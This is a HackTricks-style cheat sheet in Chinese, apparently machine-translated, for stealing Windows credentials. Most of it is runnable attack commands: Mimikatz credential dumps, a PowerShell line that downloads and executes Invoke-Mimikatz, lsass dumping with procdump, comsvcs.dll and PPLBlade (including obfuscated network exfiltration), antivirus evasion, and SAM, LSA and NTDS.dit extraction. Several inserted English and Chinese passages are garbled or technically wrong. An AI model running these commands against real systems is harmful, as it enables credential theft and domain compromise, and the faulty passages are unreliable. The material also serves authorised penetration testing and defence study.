# 窃取Windows凭据

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云平台 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## Mimikatz凭据窃取
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**在[此页面](credentials-mimikatz.md)**中查找Mimikatz可以执行的其他操作。

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**在这里了解一些可能的凭证保护措施。**](credentials-protections.md) **这些保护措施可以防止Mimikatz提取某些凭证。**

## 使用Meterpreter获取凭证

使用我创建的[**凭证插件**](https://github.com/carlospolop/MSF-Credentials) **来搜索受害者内部的密码和哈希值**。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## 绕过杀毒软件

### Procdump + Mimikatz

由于**SysInternals的Procdump是一个合法的微软工具**，所以它不会被Defender检测到。\
您可以使用此工具来**转储lsass进程**，**下载转储文件**并从转储文件中**提取本地凭据**。

{% code title="转储lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% code title="从转储中提取凭据" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

这个过程是使用 [SprayKatz](https://github.com/aas-n/spraykatz) 自动完成的：`./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**：一些 **AV** 可能会将使用 **procdump.exe 转储 lsass.exe** 检测为 **恶意行为**，这是因为它们检测到了字符串 **"procdump.exe" 和 "lsass.exe"**。因此，将 lsass.exe 的 **PID** 作为参数传递给 procdump，而不是使用名称 lsass.exe，这样更加隐蔽。

### 使用 **comsvcs.dll** 转储 lsass

有一个名为 **comsvcs.dll** 的 DLL，位于 `C:\Windows\System32`，它在进程 **崩溃** 时会 **转储进程内存**。这个 DLL 包含一个名为 **`MiniDumpW`** 的函数，可以使用 `rundll32.exe` 调用它。\
前两个参数没有使用，但第三个参数被分成了三个部分。第一部分是要转储的进程 ID，第二部分是转储文件的位置，第三部分是单词 **full**。没有其他选择。\
一旦解析了这三个参数，基本上这个 DLL 就会创建转储文件，并将指定的进程转储到该转储文件中。\
借助这个函数，我们可以使用 **comsvcs.dll** 转储 lsass 进程，而不是上传 procdump 并执行它。（此信息摘自 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/)）
```
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
我们只需要记住这个技术只能在**SYSTEM**权限下执行。

**你可以使用** [**lssasy**](https://github.com/Hackndo/lsassy)**来自动化这个过程。**

### **使用任务管理器转储lsass**

1. 右键点击任务栏，然后点击任务管理器
2. 点击更多详细信息
3. 在进程选项卡中搜索"本地安全局进程"进程
4. 右键点击"本地安全局进程"进程，然后点击"创建转储文件"。

### 使用procdump转储lsass

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)是微软签名的二进制文件，是[sysinternals](https://docs.microsoft.com/en-us/sysinternals/)套件的一部分。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## 使用PPLBlade转储lsass

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade)是一款受保护的进程转储工具，支持对内存转储进行混淆，并在不将其放入磁盘的情况下传输到远程工作站。

**关键功能**：

1. 绕过PPL保护
2. 对内存转储文件进行混淆，以逃避Defender基于签名的检测机制
3. 使用RAW和SMB上传方法上传内存转储，而无需将其放入磁盘（无文件转储）

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### 转储SAM哈希值
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### 转储 LSA 密钥

#### 描述

本技术手册将介绍如何通过转储 LSA（本地安全局）密钥来窃取凭据。LSA 密钥是 Windows 操作系统中存储敏感凭据的地方，包括密码、证书和其他身份验证信息。通过获取这些密钥，黑客可以获取用户的凭据并进一步入侵系统。

#### 步骤

1. 打开命令提示符或 PowerShell 终端。

2. 运行以下命令以转储 LSA 密钥：

   ```plaintext
   reg save HKLM\SECURITY security.hive
   ```

   此命令将导出 LSA 密钥到名为 `security.hive` 的文件中。

3. 使用合适的工具（如 Mimikatz）来解析 `security.hive` 文件并提取敏感凭据。

   ```plaintext
   mimikatz.exe "sekurlsa::minidump security.hive" "sekurlsa::logonPasswords full"
   ```

   Mimikatz 将解析 `security.hive` 文件并显示其中存储的凭据信息。

4. 分析提取的凭据以获取所需的敏感信息。

#### 注意事项

- 在执行此技术时，请确保您已获得合法的授权，并且仅在合法的渗透测试活动中使用。
- 转储 LSA 密钥可能会触发安全警报，因此请在适当的环境中进行测试，并遵守适用的法律和规定。
- 请注意，此技术可能会违反某些国家或地区的法律。在使用此技术之前，请确保您了解并遵守当地的法律法规。
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 从目标域控制器中转储NTDS.dit文件

To dump the NTDS.dit file from a target domain controller, you can use various techniques such as:

- **NTDSUtil**: This built-in Windows utility allows you to perform various operations on the Active Directory database, including dumping the NTDS.dit file. You can use the following command to dump the file:

  ```
  ntdsutil "ac i ntds" "ifm" "create full C:\path\to\dump\folder" q q
  ```

  Replace `C:\path\to\dump\folder` with the desired path where you want to save the dumped NTDS.dit file.

- **Mimikatz**: This powerful post-exploitation tool can also be used to dump the NTDS.dit file. You can use the following command within Mimikatz:

  ```
  lsadump::dcsync /domain:<domain_name> /all /csv
  ```

  Replace `<domain_name>` with the name of the target domain.

Remember that dumping the NTDS.dit file requires administrative privileges on the target domain controller. Additionally, be cautious when handling sensitive data and ensure that you have proper authorization to perform such actions.
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 从目标域控制器中转储NTDS.dit密码历史记录

To dump the NTDS.dit password history from a target domain controller, you can use the following steps:

1. 首先，通过获取域管理员权限或具有域管理员权限的用户凭据，登录到目标域控制器。

2. 打开命令提示符或PowerShell，并以管理员身份运行。

3. 使用以下命令导航到NTDS.dit文件所在的目录：
   ```
   cd C:\Windows\NTDS
   ```

4. 运行以下命令以加载NTDS数据库：
   ```
   ntdsutil
   activate instance ntds
   ```

5. 运行以下命令以创建一个新的安全标识符（SID）：
   ```
   ifm
   create full c:\temp
   ```

6. 导出NTDS.dit文件和系统注册表到指定的目录：
   ```
   quit
   quit
   ```

7. 现在，你可以在指定的目录（例如c:\temp）中找到NTDS.dit文件和系统注册表文件。

通过执行上述步骤，你可以成功地从目标域控制器中转储NTDS.dit密码历史记录。请注意，这需要管理员权限或具有域管理员权限的用户凭据。
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 显示每个NTDS.dit账户的pwdLastSet属性

To show the `pwdLastSet` attribute for each account in the NTDS.dit file, you can use the following PowerShell command:

```powershell
Get-ADUser -Filter * -Properties pwdLastSet | Select-Object Name, pwdLastSet
```

This command will retrieve all user accounts in the NTDS.dit file and display their `Name` and `pwdLastSet` attributes.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## 盗取SAM和SYSTEM文件

这些文件应该位于_C:\windows\system32\config\SAM_和_C:\windows\system32\config\SYSTEM_。但是，**你不能简单地以常规方式复制它们**，因为它们受到保护。

### 从注册表中获取

最简单的方法是从注册表中获取这些文件的副本：
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**下载**这些文件到你的Kali机器上，并使用以下命令**提取哈希值**：
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### 卷影副本

您可以使用此服务执行受保护文件的副本。您需要是管理员。

#### 使用vssadmin

vssadmin二进制文件仅在Windows Server版本中可用。
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
但是你也可以使用**Powershell**来完成相同的操作。以下是一个示例，演示如何复制SAM文件（硬盘使用的是"C:"，保存到C:\users\Public），但你也可以用它来复制任何受保护的文件：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
代码来自书籍：[https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

最后，您还可以使用[**PS脚本Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)来复制SAM、SYSTEM和ntds.dit文件。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory凭据 - NTDS.dit**

**Ntds.dit文件是存储Active Directory数据的数据库**，包括有关用户对象、组和组成员的信息。它包含域中所有用户的密码哈希值。

重要的NTDS.dit文件将**位于**：_%SystemRoom%/NTDS/ntds.dit_\
该文件是一个由3个表组成的数据库_Extensible Storage Engine_（ESE）：

* **数据表**：包含对象（用户、组等）的信息
* **链接表**：关系的信息（成员关系等）
* **SD表**：包含每个对象的安全描述符

有关更多信息，请访问：[http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows使用_Ntdsa.dll_与该文件进行交互，并由_lsass.exe_使用。然后，**NTDS.dit**文件的**一部分**可能位于**`lsass`**内存中（您可以通过使用**缓存**来找到最近访问的数据，可能是因为性能的提升）。

#### 解密NTDS.dit中的哈希值

哈希值被加密了3次：

1. 使用**BOOTKEY**和**RC4**解密密码加密密钥（**PEK**）。
2. 使用**PEK**和**RC4**解密**哈希值**。
3. 使用**DES**解密**哈希值**。

**PEK**在**每个域控制器**中具有**相同的值**，但它在**NTDS.dit**文件中使用**域控制器的SYSTEM文件的BOOTKEY（在域控制器之间是不同的）**进行加密。这就是为什么要从NTDS.dit文件中获取凭据，**您需要NTDS.dit和SYSTEM文件**（_C:\Windows\System32\config\SYSTEM_）。

### 使用Ntdsutil复制NTDS.dit

自Windows Server 2008以来可用。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
你还可以使用[**卷影复制**](./#stealing-sam-and-system)技巧来复制**ntds.dit**文件。记住，你还需要**SYSTEM文件**的副本（同样，[**从注册表中转储或使用卷影复制**](./#stealing-sam-and-system)技巧）。

### **从NTDS.dit中提取哈希值**

一旦你**获取到**了**NTDS.dit**和**SYSTEM**文件，你可以使用工具如_secretsdump.py_来**提取哈希值**：
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
您还可以使用有效的域管理员用户**自动提取它们**：
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
对于**大型的NTDS.dit文件**，建议使用[gosecretsdump](https://github.com/c-sto/gosecretsdump)来提取它。

最后，您还可以使用**metasploit模块**：_post/windows/gather/credentials/domain\_hashdump_或**mimikatz** `lsadump::lsa /inject`

### **将NTDS.dit中的域对象提取到SQLite数据库中**

可以使用[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)将NTDS对象提取到SQLite数据库中。不仅提取了密码，还提取了整个对象及其属性，以便在已经获取到原始NTDS.dit文件时进行进一步的信息提取。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM`注册表是可选的，但可以用于解密秘密信息（如NT和LM哈希、补充凭据，如明文密码、Kerberos或信任密钥、NT和LM密码历史记录）。除其他信息外，还提取以下数据：用户和计算机帐户及其哈希值、UAC标志、上次登录和更改密码的时间戳、帐户描述、名称、UPN、SPN、组和递归成员、组织单位树和成员、具有信任类型、方向和属性的受信任域...

## Lazagne

从[这里](https://github.com/AlessandroZ/LaZagne/releases)下载二进制文件。您可以使用此二进制文件从多个软件中提取凭据。
```
lazagne.exe all
```
## 从SAM和LSASS中提取凭据的其他工具

### Windows凭据编辑器（WCE）

该工具可用于从内存中提取凭据。从以下链接下载：[http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

从SAM文件中提取凭据
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

从SAM文件中提取凭据

```plaintext
PwDump is a tool used to extract credentials from the Security Account Manager (SAM) file in Windows operating systems. The SAM file stores password hashes for local user accounts on the system.

By extracting the credentials from the SAM file, an attacker can gain access to user passwords and potentially escalate their privileges on the compromised system.

PwDump works by reading the SAM file and extracting the password hashes. These hashes can then be cracked using various password cracking techniques, such as dictionary attacks or brute-force attacks, to obtain the actual passwords.

It is important to note that PwDump requires administrative privileges to access the SAM file. Additionally, it is considered a malicious tool and should only be used for authorized penetration testing or security research purposes.

To use PwDump, simply run the tool with administrative privileges and specify the path to the SAM file. The tool will then extract the password hashes and display them in a readable format.

Example usage:

```
PwDump.exe C:\Windows\System32\config\SAM
```

This will extract the password hashes from the SAM file located at `C:\Windows\System32\config\SAM`.

It is recommended to use PwDump responsibly and in accordance with applicable laws and regulations.
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

从[http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7)下载并**执行它**，密码将被提取。

## 防御措施

[**在这里了解一些凭据保护措施。**](credentials-protections.md)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
